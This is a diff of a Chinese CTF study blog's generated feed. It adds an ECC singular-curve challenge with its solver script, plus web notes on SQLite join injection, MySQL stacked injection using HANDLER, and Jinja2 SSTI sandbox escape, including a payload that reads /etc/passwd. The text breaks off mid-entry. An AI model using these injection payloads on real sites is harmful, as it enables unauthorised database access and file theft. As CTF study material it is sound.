@@ -29,6 +29,31 @@
     
     
     <entry>
+      <title>ECC（奇异曲线）</title>
+      <link href="/blog/2026/04/23/ECC%EF%BC%88%E5%A5%87%E5%BC%82%E6%9B%B2%E7%BA%BF%EF%BC%89/"/>
+      <url>/blog/2026/04/23/ECC%EF%BC%88%E5%A5%87%E5%BC%82%E6%9B%B2%E7%BA%BF%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ECC（奇异曲线）"><a href="#ECC（奇异曲线）" class="headerlink" title="ECC（奇异曲线）"></a>ECC（奇异曲线）</h1><p>标签（空格分隔）： 离散对数</p><hr><h2 id="奇异曲线的基本解法"><a href="#奇异曲线的基本解法" class="headerlink" title="奇异曲线的基本解法"></a>奇异曲线的基本解法</h2><p>什么是奇异曲线呢？奇异曲线就是一个椭圆曲线上有一个点没有导数</p><p>首先得知道ECC的一个定理$ \phi(G)^n&#x3D;\phi(nG)$<br>这里的$\phi(y,x)&#x3D; {y+ax \over y-ax}$<br><code>注意此时的方程必须满足</code>$y^2&#x3D;x^3+ax^2$<br>所以我们可以很简单的得到n。但是原方程不是这样的啊。我们便可以将那个没有导数的点移动到原点，然后再进行套用解出n</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from secrets import flag</span><br><span class="line"></span><br><span class="line">p = 9259018534502783714631247560818133078409930397939705162361230465031580254504264713899169170790687716589100652406132800533397486109926387016562663961524649</span><br><span class="line">a = 0</span><br><span class="line">b = 6235467631650349040636525320446729529985562949423449382969614887116983248527693872546808737512375916974084741892428681798937790855872528526403738040908493</span><br><span class="line">c = 4165903654767429195543540819098180314477702137507994424192636596518008877139978822038616746899053449640020812062736993008962585578921635697413459959685760</span><br><span class="line">d = 1889382340373247565387211782596794283852946561870564309251998196824383297786878212641581641540685106266683503654620956037368416192796434147249748216284648</span><br><span class="line">e = 3015564788819504594313842562882781366361783108618226049128986996153057550014499326419988348165744003693083108924831219996703133056523468396967900376388617</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(P1, P2):</span><br><span class="line">    if P1 is None:</span><br><span class="line">        return P2</span><br><span class="line"></span><br><span class="line">    x1, y1 = P1</span><br><span class="line">    x2, y2 = P2</span><br><span class="line"></span><br><span class="line">    l = (y2 - y1) * pow(x2 - x1, -1, p) % p</span><br><span class="line">    x3 = (l**2 + a * l - b - x1 - x2) % p</span><br><span class="line">    y3 = (l * (x1 - x3) - y1 - a * x3 - c) % p</span><br><span class="line">    return (x3, y3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def double(P):</span><br><span class="line">    if P is None:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    x, y = P</span><br><span class="line"></span><br><span class="line">    denom = (2 * y + a * x + c) % p</span><br><span class="line">    num = (3 * x**2 + 2 * b * x + d - a * y) % p</span><br><span class="line">    l = (num * pow(denom, -1, p)) % p</span><br><span class="line">    x3 = (l**2 + a * l - b - 2 * x) % p</span><br><span class="line">    y3 = (l * (x - x3) - y - a * x3 - c) % p</span><br><span class="line">    return (x3, y3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mul(k, P):</span><br><span class="line">    Q = None</span><br><span class="line">    while k:</span><br><span class="line">        if k &amp; 1:</span><br><span class="line">            Q = add(Q, P)</span><br><span class="line">        P = double(P)</span><br><span class="line">        k &gt;&gt;= 1</span><br><span class="line">    return Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">G = (1244884551970947614719458919805713649754289814760243366205012699871413235954279930743612403791919112394457579170253990713250052822262255880036254772609156, 4579639528751113977115209571728128585569082149696598770106934145500742785077382446292613925719404433141749168427443122707253164477493499731016883616496009)</span><br><span class="line">P = mul(m, G)</span><br><span class="line">print(P)</span><br><span class="line"></span><br><span class="line"># (9039120379228240875764080238389949393433230267005269099421166553853462484353350917730468887801035670710981414900285176863179650428412616144755102163764906, 6266065680737729548475090556806928225106996606788926050268440244885398464756877886842570309216095272026404453765198968208595242208306240371310555394416694)</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># 1. 题目参数</span><br><span class="line">p = 9259018534502783714631247560818133078409930397939705162361230465031580254504264713899169170790687716589100652406132800533397486109926387016562663961524649</span><br><span class="line">a = 0</span><br><span class="line">b = 6235467631650349040636525320446729529985562949423449382969614887116983248527693872546808737512375916974084741892428681798937790855872528526403738040908493</span><br><span class="line">c = 4165903654767429195543540819098180314477702137507994424192636596518008877139978822038616746899053449640020812062736993008962585578921635697413459959685760</span><br><span class="line">d = 1889382340373247565387211782596794283852946561870564309251998196824383297786878212641581641540685106266683503654620956037368416192796434147249748216284648</span><br><span class="line">e = 3015564788819504594313842562882781366361783108618226049128986996153057550014499326419988348165744003693083108924831219996703133056523468396967900376388617</span><br><span class="line"></span><br><span class="line">G_x = 1244884551970947614719458919805713649754289814760243366205012699871413235954279930743612403791919112394457579170253990713250052822262255880036254772609156</span><br><span class="line">G_y = 4579639528751113977115209571728128585569082149696598770106934145500742785077382446292613925719404433141749168427443122707253164477493499731016883616496009</span><br><span class="line">P_x = 9039120379228240875764080238389949393433230267005269099421166553853462484353350917730468887801035670710981414900285176863179650428412616144755102163764906</span><br><span class="line">P_y = 6266065680737729548475090556806928225106996606788926050268440244885398464756877886842570309216095272026404453765198968208595242208306240371310555394416694</span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line"># 2. 寻找奇异点 (xs, ys)</span><br><span class="line"># 偏导数方程: </span><br><span class="line"># f(x,y) = x^3 + b*x^2 + d*x + e - y^2 - c*y = 0</span><br><span class="line"># df/dy = -2y - c = 0 =&gt; ys = -c/2</span><br><span class="line">ys = F(-c) / F(2)</span><br><span class="line"></span><br><span class="line"># df/dx = 3x^2 + 2bx + d = 0</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">df_dx = 3*x^2 + 2*b*x + d</span><br><span class="line">roots = df_dx.roots()</span><br><span class="line"></span><br><span class="line">xs = None</span><br><span class="line">for r, _ in roots:</span><br><span class="line">    # 验证该根是否在曲线上</span><br><span class="line">    if r^3 + b*r^2 + d*r + e - ys^2 - c*ys == 0:</span><br><span class="line">        xs = F(r)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(f&quot;Singular point found: (&#123;xs&#125;, &#123;ys&#125;)&quot;)</span><br><span class="line"></span><br><span class="line"># 3. 平移点 G 和 P 使奇异点落在 (0,0)</span><br><span class="line">Gx_sh, Gy_sh = F(G_x) - xs, F(G_y) - ys</span><br><span class="line">Px_sh, Py_sh = F(P_x) - xs, F(P_y) - ys</span><br><span class="line"></span><br><span class="line"># 4. 判断奇异曲线的类型 (Cusp 或 Node)</span><br><span class="line"># 平移后的方程为: y^2 = x^3 + A * x^2, 其中 A = 3*xs + b</span><br><span class="line">A = 3*xs + F(b)</span><br><span class="line"></span><br><span class="line">if A == 0:</span><br><span class="line">    print(&quot;Curve type: Cusp (Additive Group)&quot;)</span><br><span class="line">    # 对于 Cusp，同构映射为: phi(x,y) = x / y</span><br><span class="line">    phi_G = Gx_sh / Gy_sh</span><br><span class="line">    phi_P = Px_sh / Py_sh</span><br><span class="line">    m = phi_P / phi_G</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Curve type: Node (Multiplicative Group)&quot;)</span><br><span class="line">    # 对于 Node，同构映射为: phi(x,y) = (y + alpha * x) / (y - alpha * x)</span><br><span class="line">    # 其中 alpha = sqrt(A)</span><br><span class="line">    # 检查 A 是否是模 p 的二次剩余</span><br><span class="line">    if A.is_square():</span><br><span class="line">        alpha = A.sqrt()</span><br><span class="line">        phi_G = (Gy_sh + alpha * Gx_sh) / (Gy_sh - alpha * Gx_sh)</span><br><span class="line">        phi_P = (Py_sh + alpha * Px_sh) / (Py_sh - alpha * Px_sh)</span><br><span class="line">        m = discrete_log(phi_P, phi_G)</span><br><span class="line">    else:</span><br><span class="line">        # 如果不是二次剩余，需在二次扩域 Fp2 中求解</span><br><span class="line">        F2.&lt;u&gt; = F.extension(x^2 - A)</span><br><span class="line">        alpha = u</span><br><span class="line">        phi_G = (Gy_sh + alpha * Gx_sh) / (Gy_sh - alpha * Gx_sh)</span><br><span class="line">        phi_P = (Py_sh + alpha * Px_sh) / (Py_sh - alpha * Px_sh)</span><br><span class="line">        m = discrete_log(phi_P, phi_G)</span><br><span class="line"></span><br><span class="line">print(&quot;m =&quot;, m)</span><br><span class="line">try:</span><br><span class="line">    print(&quot;Flag:&quot;, long_to_bytes(int(m)).decode())</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Hex string:&quot;, hex(int(m)))</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Crypto </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 离散对数 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>背包密码简记</title>
       <link href="/blog/2026/03/26/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%80%E8%AE%B0/"/>
       <url>/blog/2026/03/26/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%80%E8%AE%B0/</url>
@@ -133,7 +158,7 @@
       <link href="/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/"/>
       <url>/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/</url>
       
-        <content type="html"><![CDATA[<h1 id="ECC-椭圆曲线加密"><a href="#ECC-椭圆曲线加密" class="headerlink" title="ECC(椭圆曲线加密)"></a>ECC(椭圆曲线加密)</h1><p>标签（空格分隔）： ECC</p><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ECC 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有</p><p>以素数为模的整数域 GF(p)，通常在通用处理器上更为有效。<br>特征为 2 的伽罗华域 GF（2^m），可以设计专门的硬件。</p><p>##基本知识<br>我们首先来了解一下有限域上的椭圆曲线，有限域上的椭圆曲线是指在椭圆曲线的定义式</p><center>$y^2+axy+by = x^3 + cx^2 + dx +e$</center><p>在以域为P下的方程也就是GF(p)<br>并非所有的方程都适用于加密，最常用的加密就是</p><center>$y^2 = x^3 +ax+b$</center><h2 id="运算相关"><a href="#运算相关" class="headerlink" title="运算相关"></a>运算相关</h2><p><code>注意：所有运算都是在 GF(p) 中，除法实际上是乘以模逆元</code><br>在一条曲线的点的相乘和相加是特殊的</p><h3 id="两点相加"><a href="#两点相加" class="headerlink" title="两点相加"></a>两点相加</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 已知 P = (x1, y1), Q = (x2, y2)</span><br><span class="line"># 计算 R = (x3, y3)</span><br><span class="line"></span><br><span class="line">λ = (y2 - y1) / (x2 - x1)    # 斜率</span><br><span class="line">x3 = λ² - x1 - x2</span><br><span class="line">y3 = λ(x1 - x3) - y1</span><br></pre></td></tr></table></figure><h3 id="点的倍乘"><a href="#点的倍乘" class="headerlink" title="点的倍乘"></a>点的倍乘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 已知 P = (x1, y1), y1 ≠ 0</span><br><span class="line"># 计算 2P = (x3, y3)</span><br><span class="line"></span><br><span class="line">λ = (3x1² + a) / (2y1)       # 切线斜率</span><br><span class="line">x3 = λ² - 2x1</span><br><span class="line">y3 = λ(x1 - x3) - y1</span><br></pre></td></tr></table></figure><h3 id="二进制分解算法"><a href="#二进制分解算法" class="headerlink" title="二进制分解算法"></a>二进制分解算法</h3><p>ECC 公钥计算的核心是标量乘法：<code>K = k × G</code><br>初始化结果点 R &#x3D; O（无穷远点，加法单位元）<br>从二进制最高位到最低位遍历：<br>每一步先将当前结果 加倍：R &#x3D; 2R<br>如果当前位为 1，再 加上基点：R &#x3D; R + G<br>遍历结束后，R 就是 k × G</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def scalar_multiply(k, G, p, a):</span><br><span class="line">    &quot;&quot;&quot;计算 k × G&quot;&quot;&quot;</span><br><span class="line">    binary_k = bin(k)[2:]  # 转换为二进制字符串</span><br><span class="line">    R = None  # 无穷远点</span><br><span class="line">    current = G</span><br><span class="line">    </span><br><span class="line">    for bit in reversed(binary_k):  # 从最低位开始</span><br><span class="line">        if bit == &#x27;1&#x27;:</span><br><span class="line">            if R is None:</span><br><span class="line">                R = current</span><br><span class="line">            else:</span><br><span class="line">                R = point_add(R, current, p, a)</span><br><span class="line">        current = point_double(current, p, a)</span><br><span class="line">    </span><br><span class="line">    return R</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h1 id="ECC-椭圆曲线加密"><a href="#ECC-椭圆曲线加密" class="headerlink" title="ECC(椭圆曲线加密)"></a>ECC(椭圆曲线加密)</h1><p>标签（空格分隔）： ECC</p><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ECC 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有</p><p>以素数为模的整数域 GF(p)，通常在通用处理器上更为有效。<br>特征为 2 的伽罗华域 GF（2^m），可以设计专门的硬件。</p><p>##基本知识<br>我们首先来了解一下有限域上的椭圆曲线，有限域上的椭圆曲线是指在椭圆曲线的定义式</p><center>$y^2+axy+by = x^3 + cx^2 + dx +e$</center><p>在以域为P下的方程也就是GF(p)<br>并非所有的方程都适用于加密，最常用的加密就是</p><center>$y^2 = x^3 +ax+b$</center><h2 id="运算相关"><a href="#运算相关" class="headerlink" title="运算相关"></a>运算相关</h2><p><code>注意：所有运算都是在 GF(p) 中，除法实际上是乘以模逆元</code><br>在一条曲线的点的相乘和相加是特殊的<br>两点相加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 已知 P = (x1, y1), Q = (x2, y2)</span><br><span class="line"># 计算 R = (x3, y3)</span><br><span class="line"></span><br><span class="line">λ = (y2 - y1) / (x2 - x1)    # 斜率</span><br><span class="line">x3 = λ² - x1 - x2</span><br><span class="line">y3 = λ(x1 - x3) - y1</span><br></pre></td></tr></table></figure><p>点的倍乘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 已知 P = (x1, y1), y1 ≠ 0</span><br><span class="line"># 计算 2P = (x3, y3)</span><br><span class="line"></span><br><span class="line">λ = (3x1² + a) / (2y1)       # 切线斜率</span><br><span class="line">x3 = λ² - 2x1</span><br><span class="line">y3 = λ(x1 - x3) - y1</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -329,31 +354,6 @@
     
     
     <entry>
-      <title>SQLite</title>
-      <link href="/blog/2026/01/28/SQLite/"/>
-      <url>/blog/2026/01/28/SQLite/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SQL&#39;select&#39;绕过</title>
       <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
       <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
@@ -396,6 +396,56 @@
         <tags>
             
             <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLite</title>
+      <link href="/blog/2026/01/28/SQLite/"/>
+      <url>/blog/2026/01/28/SQLite/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL堆叠注入</title>
+      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
             
         </tags>
       
@@ -454,6 +504,31 @@
     
     
     <entry>
+      <title>SSTI简记</title>
+      <link href="/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
+      <url>/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span 